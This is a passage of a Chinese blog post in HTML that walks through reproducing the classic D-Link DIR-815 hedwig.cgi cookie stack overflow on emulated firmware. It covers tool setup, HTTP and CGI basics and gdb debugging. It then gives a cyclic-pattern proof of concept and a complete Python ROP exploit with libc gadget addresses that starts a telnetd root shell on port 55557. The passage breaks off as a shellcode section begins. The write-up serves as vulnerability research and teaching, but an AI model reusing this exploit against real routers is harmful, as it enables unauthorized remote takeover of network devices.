@@ -1,0 +1,555 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="概述个人感觉麻烦的点在于环境的搭建(又回到最初一瓶农夫山泉搁那配一天环境的日子,一个点没注意就出问题,甚至桌上的农夫山泉都换成了怡宝),本文着重记录下自己踩得坑,对于漏洞的详细分析可以看看参考文章.然后关于IOT通信还涉及到http协议和cgi,我也以我的理解简单介绍下">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从D-Link_DIR815路由器经典漏洞开启IOT之旅">
+<meta property="og:url" content="http://example.com/2025/06/04/%E4%BB%8ED-Link_DIR815%E8%B7%AF%E7%94%B1%E5%99%A8%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E%E5%BC%80%E5%90%AFIOT%E4%B9%8B%E6%97%85/index.html">
+<meta property="og:site_name" content="Sn0r1ax">
+<meta property="og:description" content="概述个人感觉麻烦的点在于环境的搭建(又回到最初一瓶农夫山泉搁那配一天环境的日子,一个点没注意就出问题,甚至桌上的农夫山泉都换成了怡宝),本文着重记录下自己踩得坑,对于漏洞的详细分析可以看看参考文章.然后关于IOT通信还涉及到http协议和cgi,我也以我的理解简单介绍下">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/IOT%E5%85%A5%E9%97%A8/0.png">
+<meta property="og:image" content="http://example.com/images/IOT%E5%85%A5%E9%97%A8/1.png">
+<meta property="og:image" content="http://example.com/images/IOT%E5%85%A5%E9%97%A8/2.png">
+<meta property="og:image" content="http://example.com/images/IOT%E5%85%A5%E9%97%A8/3.png">
+<meta property="og:image" content="http://example.com/images/IOT%E5%85%A5%E9%97%A8/4.png">
+<meta property="og:image" content="http://example.com/images/IOT%E5%85%A5%E9%97%A8/6.png">
+<meta property="og:image" content="http://example.com/images/IOT%E5%85%A5%E9%97%A8/5.png">
+<meta property="og:image" content="http://example.com/images/IOT%E5%85%A5%E9%97%A8/7.png">
+<meta property="og:image" content="http://example.com/images/IOT%E5%85%A5%E9%97%A8/8.png">
+<meta property="article:published_time" content="2025-06-04T12:36:59.730Z">
+<meta property="article:modified_time" content="2025-06-05T13:00:20.663Z">
+<meta property="article:author" content="Sn0r1ax">
+<meta property="article:tag" content="初见">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/IOT%E5%85%A5%E9%97%A8/0.png">
+
+<link rel="canonical" href="http://example.com/2025/06/04/%E4%BB%8ED-Link_DIR815%E8%B7%AF%E7%94%B1%E5%99%A8%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E%E5%BC%80%E5%90%AFIOT%E4%B9%8B%E6%97%85/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>从D-Link_DIR815路由器经典漏洞开启IOT之旅 | Sn0r1ax</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Sn0r1ax</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Sleep all day</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/06/04/%E4%BB%8ED-Link_DIR815%E8%B7%AF%E7%94%B1%E5%99%A8%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E%E5%BC%80%E5%90%AFIOT%E4%B9%8B%E6%97%85/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/avatar.png">
+      <meta itemprop="name" content="Sn0r1ax">
+      <meta itemprop="description" content="😘😘😘">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sn0r1ax">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          从D-Link_DIR815路由器经典漏洞开启IOT之旅
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-06-04 20:36:59" itemprop="dateCreated datePublished" datetime="2025-06-04T20:36:59+08:00">2025-06-04</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-05 21:00:20" itemprop="dateModified" datetime="2025-06-05T21:00:20+08:00">2025-06-05</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>个人感觉麻烦的点在于环境的搭建(又回到最初一瓶农夫山泉搁那配一天环境的日子,一个点没注意就出问题,甚至桌上的农夫山泉都换成了怡宝),本文着重记录下自己踩得坑,对于漏洞的详细分析可以看看参考文章.然后关于IOT通信还涉及到http协议和cgi,我也以我的理解简单介绍下</p>
+<span id="more"></span>
+
+<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>我所使用的是<a target="_blank" rel="noopener" href="https://github.com/pr0v3rbs/FirmAE">firmAE</a>来进行的固件模拟</p>
+<p>推荐使用ubuntu20.04虚拟机进行环境搭建(因为firmAE项目测试是使用的该版本,我自己也是使用的该版本来搭建的环境)</p>
+<p>使用wsl搭建环境要访问模拟出来的网页可能会较为麻烦</p>
+<p>工具介绍:</p>
+<p><strong>binwalk</strong>:用于提取固件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me target_file.bin</span><br></pre></td></tr></table></figure>
+
+<p>这个工具依赖于<a target="_blank" rel="noopener" href="https://github.com/devttys0/sasquatch">sasquatch</a>工具</p>
+<p>你可能会遇到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Hunk #1 succeeded at 32 with fuzz 1.</span><br><span class="line">cc -g -O2  -I. -I./LZMA/lzma465/C -I./LZMA/lzmalt -I./LZMA/lzmadaptive/C/7zip/Compress/LZMA_Lib -D_FILE_OFFSET_BITS=64 -D_LARGEFILE_SOURCE -D_GNU_SOURCE -DCOMP_DEFAULT=\&quot;gzip\&quot; -Wall -Werror  -DGZIP_SUPPORT -DLZMA_SUPPORT -DXZ_SUPPORT -DLZO_SUPPORT -DXATTR_SUPPORT -DXATTR_DEFAULT   -c -o unsquashfs.o unsquashfs.c</span><br><span class="line">unsquashfs.c: In function ‘read_super’:</span><br><span class="line">unsquashfs.c:1835:5: error: this ‘if’ clause does not guard... [-Werror=misleading-indentation]</span><br><span class="line"> 1835 |     if(swap)</span><br><span class="line">      |     ^~</span><br><span class="line">unsquashfs.c:1841:9: note: ...this statement, but the latter is misleadingly indented as if it were guarded by the ‘if’</span><br><span class="line"> 1841 |         read_fs_bytes(fd, SQUASHFS_START, sizeof(struct squashfs_super_block),</span><br><span class="line">      |         ^~~~~~~~~~~~~</span><br><span class="line">cc1: all warnings being treated as errors</span><br><span class="line">make: *** [&lt;builtin&gt;: unsquashfs.o] Error 1</span><br></pre></td></tr></table></figure>
+
+<p>这个报错原因是在<code>unsquashfs.c</code>文件在编译时其内容中的一些行出现空格和制表符混用</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/devttys0/sasquatch/issues/48#issuecomment-1432378603">解决方法</a></p>
+<p>如果更改后运行<code>build.sh</code>是有关<code>LZMA</code>的爆红,修改<code>./squashfs4.3/squashfs-tools/</code>目录中<code>Makefile</code>的<code>XZ_SUPPORT = 1</code></p>
+<p>如果仍然关于<code>LZMA</code>爆红,先通过<code>xz --version</code>检查其是否存在</p>
+<p><img src="/../images/IOT%E5%85%A5%E9%97%A8/0.png" alt="0"></p>
+<p>也可能是共享文件夹权限问题,试试cp到虚拟机的目录中</p>
+<p>(其实很多问题都可以在<strong>issue</strong>中找到答案,一定要记得翻<strong>issue</strong>啊)</p>
+<p><strong>firmAE</strong></p>
+<p>其底层是基于<a target="_blank" rel="noopener" href="https://github.com/qemu/qemu">qemu</a>的</p>
+<p>其项目的<code>README.md</code>介绍的很详细,就不再赘述了</p>
+<h1 id="http协议和cgi协议"><a href="#http协议和cgi协议" class="headerlink" title="http协议和cgi协议"></a>http协议和cgi协议</h1><h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><p>HTTP协议是一种用于传输超文本的协议，它由请求和响应组成。让我们来看一下HTTP请求的各个部分，分别是请求行、消息报头、请求正文。IoT安全当中传输信息，大多数需要HTTP协议来进行。</p>
+<p>一个完整的http请求包含<strong>请求行</strong>,<strong>消息报头</strong>,<strong>请求正文</strong></p>
+<p>http请求的第一行是请求行,由请求方法、请求的资源路径（Request-URI）和HTTP协议的版本组成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Method Request-URI HTTP-Version CRLF</span><br></pre></td></tr></table></figure>
+
+<p>例如:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /registez.aspx HTTP/1.1 (CRLE) </span><br></pre></td></tr></table></figure>
+
+<p>紧跟着的是消息报头</p>
+<p>其包含了一系列的键值对，每个键值对由名字、冒号、空格和值组成。它们用于传递关于请求的额外信息</p>
+<p>例如:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /index.html HTTP/1.1 (CRLF) </span><br><span class="line">Accept:image/gif, image/x-xbitmap,*/* (CRLF) </span><br><span class="line">Accept-Language:zh-cn (CRLF) </span><br><span class="line">Accept-Encoding:gzip, deflate (CRLF) </span><br><span class="line">User-Rgent:Mozilla/4.0(compatible;MSIE6.0;Windows NT 5.0) (CRLF) </span><br><span class="line">Host:www.baidu.com (CRLF) </span><br><span class="line">Connection:Keep-Alive (CRLF) </span><br><span class="line">(CRLF)</span><br></pre></td></tr></table></figure>
+
+<p>最后是请求正文</p>
+<p>它包含了请求的主体内容。它位于消息报头和消息主体之间的一个空行。请求正文可以包含各种数据，例如表单数据、JSON、XML等等。</p>
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Usernarme=admin&amp;password=admin</span><br></pre></td></tr></table></figure>
+
+<p>我们在具体使用的时候，会使用python的相关库<code>request</code>或者<code>http.client</code>进行编程。</p>
+<h2 id="cgi"><a href="#cgi" class="headerlink" title="cgi"></a>cgi</h2><p><strong>CGI (Common Gateway Interface)</strong> 是 Web服务器与外部程序之间的标准化通信协议</p>
+<p>CGI协议规定Web服务器通过环境变量传递HTTP请求的元数据（请求头、方法、路径等），并通过标准输入(stdin)传递HTTP请求正文数据。外部程序则通过标准输出(stdout)返回HTTP响应。</p>
+<p>任何语言都可以用来写一个cgi脚本,一个典型的cgi脚本做了这些事</p>
+<ol>
+<li>读取用户提交表单的信息。</li>
+<li>处理这些信息（也就是实现业务）。</li>
+<li>输出，返回html响应（返回处理完的数据）。</li>
+</ol>
+<p>路由器是通过cgi脚本程序来处理web请求,这次介绍的漏洞也就出在cgi脚本程序处理输入的部分</p>
+<h1 id="漏洞简析"><a href="#漏洞简析" class="headerlink" title="漏洞简析"></a>漏洞简析</h1><p>这里借用参考文章1中的<a target="_blank" rel="noopener" href="https://rebyte.me/en/d-link/89510/file-592084/#google_vignette">固件下载链接</a></p>
+<p>漏洞位于<code>hedwigcgi_main</code>函数里</p>
+<p><img src="/../images/IOT%E5%85%A5%E9%97%A8/1.png" alt="1"></p>
+<p>这里没有对<code>string</code>的长度进行检查</p>
+<p><code>sess_get_uid</code>函数</p>
+<p><img src="/../images/IOT%E5%85%A5%E9%97%A8/2.png" alt="2"></p>
+<p>这里从消息报头中的<code>Cookie</code>读取数据,然后还存在对<code>uid</code>的比较,可以得出COOKIE的数据组织形式是<code>uid=payload</code></p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p><img src="/../images/IOT%E5%85%A5%E9%97%A8/3.png" alt="3"></p>
+<p><img src="/../images/IOT%E5%85%A5%E9%97%A8/4.png" alt="4"></p>
+<p>先启动固件模拟然后启动<code>gdb-server</code></p>
+<p>这里我把<code>aslr</code>关了,因为真机也没开</p>
+<p>然后就可以通过浏览器访问了</p>
+<p><img src="/../images/IOT%E5%85%A5%E9%97%A8/6.png" alt="6"></p>
+<p>将下列指令写入一个文件中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">set architecture mips</span><br><span class="line">set follow-fork-mode child</span><br><span class="line">set detach-on-fork off</span><br><span class="line">b *0x409480</span><br><span class="line"># catch exec</span><br><span class="line">#这里去掉注释就能在对应的cgi文件停下</span><br><span class="line">target remote 192.168.0.1:1337</span><br></pre></td></tr></table></figure>
+
+<p>然后通过</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch -x your_file</span><br></pre></td></tr></table></figure>
+
+<p>启动调试</p>
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> http.client</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建HTTP连接</span></span><br><span class="line">conn = http.client.HTTPConnection(<span class="string">&quot;192.168.0.1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置请求头</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Length&#x27;</span>: <span class="string">&#x27;21&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;accept-Encoding&#x27;</span>: <span class="string">&#x27;deflate&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;MozillIay4.0 (compatible MSIE 8.07 Winaows NT 6.17 WOW647 Triaent/4.07 SLCC27 -NET CDR 2.0.50727) -NET CLR 3.5.307297 .NET CILR 3.90.307297 Meaia CenteLr PC 6.07 .NET4.0C7 -NET4.0E)&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;192.168.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;uid=&#x27;</span>+<span class="string">&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaakuaakvaakwaakxaakyaakzaalbaalcaaldaaleaalfaalgaalhaaliaaljaalkaallaalmaalnaaloaalpaalqaalraalsaaltaaluaalvaalwaalxaalyaal&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 发送POST请求</span></span><br><span class="line">conn.request(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;/hedwig.cgi&quot;</span>, body=<span class="string">&quot;password=123&amp;bid=3Rd4&quot;</span>, headers=headers)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取响应</span></span><br><span class="line">response = conn.getresponse()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印响应状态码和响应内容</span></span><br><span class="line"><span class="built_in">print</span>(response.status, response.read().decode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭连接</span></span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure>
+
+<p>这里一大串字母是通过cyclic生成的,可以通过cyclic -l 0xdeadbeef(实际返回地址)来获得返回地址的偏移</p>
+<p><img src="/../images/IOT%E5%85%A5%E9%97%A8/5.png" alt="5"></p>
+<p>这里我测出来的偏移是1043</p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><h3 id="纯ROP链"><a href="#纯ROP链" class="headerlink" title="纯ROP链"></a>纯ROP链</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> http.client</span><br><span class="line"><span class="keyword">from</span> evilblade <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>(<span class="string">&quot;./cgibin&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建HTTP连接</span></span><br><span class="line">conn = http.client.HTTPConnection(<span class="string">&quot;192.168.0.1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## XOR $t0, $t0, $t0,相当于 nop，因为nop是\x00不能发送，会被sprintf截断</span></span><br><span class="line">nop = <span class="string">&quot;\x26\x40\x08\x01&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#libc基地址</span></span><br><span class="line">libc = <span class="number">0x77f34000</span></span><br><span class="line"><span class="comment">#gadget </span></span><br><span class="line"><span class="comment">#0x000159cc : addiu $s5, $sp, 0x10 ; move $a1, $s3 ; move $a2, $s1 ; move $t9, $s0 ; jalr $t9 ; move $a0, $s5</span></span><br><span class="line"><span class="comment">#0x000158c8 : move $t9, $s5 ; jalr $t9 ; addiu $s0, $s0, 1</span></span><br><span class="line"></span><br><span class="line">gadget = <span class="number">0x159cc</span>+libc</span><br><span class="line">gadget2 = libc+<span class="number">0x158c8</span></span><br><span class="line"><span class="built_in">print</span>(p32(gadget))</span><br><span class="line"><span class="built_in">print</span>(p32(gadget2))</span><br><span class="line"></span><br><span class="line">sys = libc + <span class="number">0x531ff</span></span><br><span class="line"><span class="built_in">print</span>(p32(sys))</span><br><span class="line">dx(sys)</span><br><span class="line">sys_ = <span class="string">&#x27;\xffq\xf8w&#x27;</span></span><br><span class="line">gad_sp = <span class="string">&quot;\xcc\x99\xf4w&quot;</span></span><br><span class="line">gad_to_s5 = <span class="string">&quot;\xc8\x98\xf4w&quot;</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">973</span>+<span class="number">34</span>).decode()</span><br><span class="line">payload += sys_ <span class="comment">#s0</span></span><br><span class="line">payload += <span class="string">&quot;cccc&quot;</span> <span class="comment">#s1</span></span><br><span class="line">payload += gad_sp*<span class="number">7</span> <span class="comment">#s2-8</span></span><br><span class="line">payload += gad_to_s5 <span class="comment">#ra</span></span><br><span class="line">payload += <span class="string">&quot;dddd&quot;</span>*<span class="number">4</span> <span class="comment">#padding</span></span><br><span class="line">payload += <span class="string">&quot;telnetd -l /bin/sh -p 55557 &amp; ls &amp; &quot;</span> <span class="comment">#通过gadget控制的a0</span></span><br><span class="line"><span class="comment"># 设置请求头</span></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;Content-Length&#x27;</span>: <span class="string">&#x27;21&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;accept-Encoding&#x27;</span>: <span class="string">&#x27;deflate&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;MozillIay4.0 (compatible MSIE 8.07 Winaows NT 6.17 WOW647 Triaent/4.07 SLCC27 -NET CDR 2.0.50727) -NET CLR 3.5.307297 .NET CILR 3.90.307297 Meaia CenteLr PC 6.07 .NET4.0C7 -NET4.0E)&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;192.168.0.1&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;uid=&#x27;</span>+payload,</span><br><span class="line"><span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送POST请求</span></span><br><span class="line">conn.request(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;/hedwig.cgi&quot;</span>, body=<span class="string">&quot;password=123&amp;uid=3Rd4&quot;</span>, headers=headers)</span><br><span class="line"><span class="comment"># 获取响应</span></span><br><span class="line">response = conn.getresponse()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印响应状态码和响应内容</span></span><br><span class="line"><span class="built_in">print</span>(response.status, response.read().decode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭连接</span></span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure>
+
+<p>这里<code>sys</code>应该是以<code>\x00</code>结尾的,直接使用会被<code>sprintf</code>函数给截断,为什么再exp里是以<code>\xff</code>结尾的呢?这是<code>sys</code>地址减一得到的,还记得上面说的流水线操作吗,在当<code>jalr</code>指令执行时,下一条指令可能已经开始执行了</p>
+<p>这里就利用了这个技巧<code>jalr $t9 ; addiu $s0, $s0, 1</code>在执行<code>jalr</code>时,后面的$s0自增指令也会执行</p>
+<p>执行exp打通后退出gdb然后通过<code>telnet</code>连上就行了</p>
+<p><img src="/../images/IOT%E5%85%A5%E9%97%A8/7.png" alt="7"></p>
+<p>在路由器固件上的<code>shell</code>也是精简版的<code>shell</code>,叫做<code>busybox</code></p>
+<h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p><code>MIPS</code>汇编有个特性,就是无法开启nx保护,这使得我们直接往栈上写<code>shellcode</code>来执行有了可行性</p>
+<p><a target="_blank" rel="noopener" href="https://shell-storm.org/online/Online-Assembler-and-Disassembler/">在线汇编转字节码</a></p>
+<p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-275619-1.htm">嵌入式设备后门与shellcode生成工具</a>:<a target="_blank" rel="noopener" href="https://github.com/doudoudedi/hackEmbedded?tab=readme-ov-file">github项目地址</a></p>
+<p>编写shellcode需要以下四步</p>
+<ol>
